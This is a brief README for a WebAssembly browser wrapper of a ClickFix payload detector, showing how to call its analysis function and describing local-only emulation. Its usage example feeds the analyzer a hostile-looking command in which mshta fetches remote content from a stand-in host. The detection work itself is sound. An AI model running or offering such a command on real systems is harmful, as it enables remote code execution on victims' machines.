# clickfix-wasm

Browser wrapper for `clickfix-detect`.

```javascript
import init, { analyze_payload } from './clickfix_wasm.js';

await init();
const { input_kind, report } = analyze_payload(
  'mshta.exe https://example.invalid/fix-error',
  'auto',
);
```

Accepted input kinds are `auto`, `command`, and `powershell`. The returned
value is a JavaScript object containing the inferred input kind and the complete
serialized `AnalysisReport`.

The browser build cannot enable the native HTTP transport. Payload emulation,
filesystem state, registry state, process dispatch, findings, URLs, IOCs,
artifacts, and trace output remain local to the WebAssembly instance.
